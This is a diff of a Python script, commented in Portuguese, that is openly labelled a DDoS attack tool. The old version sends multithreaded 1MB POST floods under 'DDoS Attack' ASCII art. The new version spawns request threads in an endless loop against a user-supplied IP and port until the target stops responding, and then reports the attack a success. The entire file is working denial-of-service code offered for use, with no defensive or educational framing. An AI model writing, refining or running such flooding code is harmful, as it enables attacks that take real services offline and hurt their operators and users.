@@ -1,56 +1,81 @@
+import requests
 import threading
-import socket
-import requests  # Usado para fazer requisições HTTP
 import time
 
-# Função para exibir a interface com letras bastão
-def exibir_interface():
-    # ASCII art para o nome "DDoS Attack"
-    print("""
-    ███████╗██████╗ ██╗███████╗ ██████╗ ███████╗████████╗
-    ██╔════╝██╔══██╗██║██╔════╝██╔══██╗██╔════╝╚══██╔══╝
-    █████╗  ██████╔╝██║█████╗  ██████╔╝███████╗   ██║
-    ██╔══╝  ██╔══██╗██║██╔══╝  ██╔══██╗╚════██╗  ██║
-    ███████╗██║  ██║██║███████╗██║  ██║███████║  ██║
-    ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ╚═╝
-    """)
-
-# Função para enviar requisições HTTP com 1MB de dados
-def enviar_requisicao(ip, porta, ataque_numero):
+# Função para enviar requisição HTTP com tratamento de exceções
+def send_request(ip, porta, attack_number):
+    url = f"http://{ip}:{porta}"
     try:
-        url = f"http://{ip}:{porta}"  # Monta a URL completa (HTTP)
-
-        # Criando um payload de 1MB (1.048.576 bytes) para o ataque
-        payload = "A" * 1048576  # 1MB de dados (exemplo com letra 'A')
-
-        # Envia uma requisição POST com o payload de 1MB de dados
-        resposta = requests.post(url, data=payload, timeout=5)  # Timeout de 5 segundos para a resposta
+        # Enviando requisição HTTP com timeout de 5 segundos
+        response = requests.get(url, timeout=5)
         
-        # Checa se a requisição foi bem-sucedida (código 200 é sucesso HTTP)
-        if resposta.status_code == 200:
-            print(f"Ataque {ataque_numero} enviado com sucesso para {ip}:{porta} - Status: {resposta.status_code}")
+        # Verificando o código de status da resposta
+        if response.status_code == 200:
+            print(f"Ataque {attack_number} enviado com sucesso para {ip}:{porta}")
+        elif response.status_code == 403:
+            print(f"Ataque {attack_number} falhou - Acesso proibido para {ip}:{porta}")
+        elif response.status_code == 404:
+            print(f"Ataque {attack_number} falhou - Página não encontrada em {ip}:{porta}")
         else:
-            print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Status: {resposta.status_code}")
+            print(f"Ataque {attack_number} falhou - Código de status inesperado: {response.status_code}")
     
     except requests.exceptions.Timeout:
-        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: Timeout")
+        print(f"Ataque {attack_number} falhou para {ip}:{porta} - Erro: Timeout")
     except requests.exceptions.ConnectionError:
-        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: Conexão recusada (Connection Refused)")
-    except Exception as e:
-        print(f"Ataque {ataque_numero} falhou para {ip}:{porta} - Erro: {e}")
+        print(f"Ataque {attack_number} falhou para {ip}:{porta} - Erro de conexão")
+    except requests.exceptions.RequestException as e:
+        print(f"Ataque {attack_number} falhou para {ip}:{porta} - Erro desconhecido: {e}")
 
-# Função principal para iniciar o ataque
-def iniciar_ataque(ip, porta, threads):
-    print("Iniciando envio de requisições...")
-    for i in range(1, threads + 1):
-        t = threading.Thread(target=enviar_requisicao, args=(ip, porta, i))
-        t.start()
-        time.sleep(0.1)  # Pequeno atraso entre o envio de cada requisição
+# Função para gerenciar o ataque DDoS com múltiplas threads
+def ataque_ddos(ip, porta):
+    print(f"Iniciando ataque DDoS para {ip}:{porta}...")
 
-# Exemplo de execução
-exibir_interface()  # Chama a função para exibir a interface com o título
-ip_destino = input("Digite o IP de destino: ")
-porta_destino = int(input("Digite a porta de destino: "))
-num_threads = int(input("Escolha o número de threads (ex.: 10): "))
+    attack_number = 1  # Contador de ataques enviados
 
-iniciar_ataque(ip_destino, porta_destino, num_threads)
+    while True:
+        try:
+            # Enviar várias threads simultaneamente
+            thread = threading.Thread(target=send_request, args=(ip, porta, attack_number))
+            thread.start()
+
+            # Atraso de 0.1 segundos entre a criação das threads
+            time.sleep(0.1)
+
+            # Incrementa o número de ataque
+            attack_number += 1
+
+        except Exception as e:
+            print(f"Erro inesperado: {e}")
+            break
+
+        # Checar se o destino ainda está acessível
+        try:
+            response = requests.get(f"http://{ip}:{porta}", timeout=5)
+            if response.status_code != 200:
+                print(f"O destino {ip}:{porta} caiu ou está inacessível. Ataque concluído com sucesso!")
+                break
+        except requests.exceptions.RequestException:
+            print(f"O destino {ip}:{porta} caiu ou está inacessível. Ataque concluído com sucesso!")
+            break
+
+    print("Ataque finalizado.")
+
+# Função principal para capturar input do usuário e executar o ataque
+def main():
+    # Captura do IP e porta de destino
+    ip = input("Digite o IP de destino (ex.: 192.168.0.1): ")
+    porta = input("Digite a porta de destino (ex.: 80): ")
+
+    # Verificando se a porta é válida
+    if not porta.isdigit():
+        print("Erro: A porta deve ser um número.")
+        return
+
+    porta = int(porta)
+
+    # Chama a função de ataque com as entradas fornecidas
+    ataque_ddos(ip, porta)
+
+# Executando o programa
+if __name__ == "__main__":
+    main()
